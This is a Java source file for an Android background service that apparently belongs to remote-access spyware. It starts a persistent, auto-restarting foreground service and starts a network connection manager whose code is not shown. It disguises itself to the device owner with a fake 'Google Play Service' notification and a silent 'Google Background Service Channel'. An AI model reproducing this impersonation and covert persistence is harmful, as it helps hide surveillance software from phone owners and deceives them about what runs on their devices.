package com.android.background.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;

import androidx.core.app.NotificationCompat;

public class MainService extends Service {

    public static final String CHANNEL_ID = BuildConfig.APPLICATION_ID;
    private static Context contextOfApplication;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        createNotificationChannel();

        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, CHANNEL_ID);

        Notification notification = notificationBuilder.setContentTitle("Google Play Service")
                .setContentText("Google is running background")
                .setSmallIcon(R.drawable.play_service_icon)
                .setOngoing(true)
                .build();
        startForeground(1, notification);

        contextOfApplication = this;
        ConnectionManager.startAsync(this);

        return Service.START_STICKY;
    }


    @Override
    public void onDestroy() {
        super.onDestroy();
    }


    public static Context getContextOfApplication()
    {
        return contextOfApplication;
    }

    private void createNotificationChannel() {

        NotificationChannel serviceChannel = new NotificationChannel(
                CHANNEL_ID,
                "Google Background Service Channel",
                NotificationManager.IMPORTANCE_NONE
        );
        NotificationManager manager = getSystemService(NotificationManager.class);
        manager.createNotificationChannel(serviceChannel);
    }
}
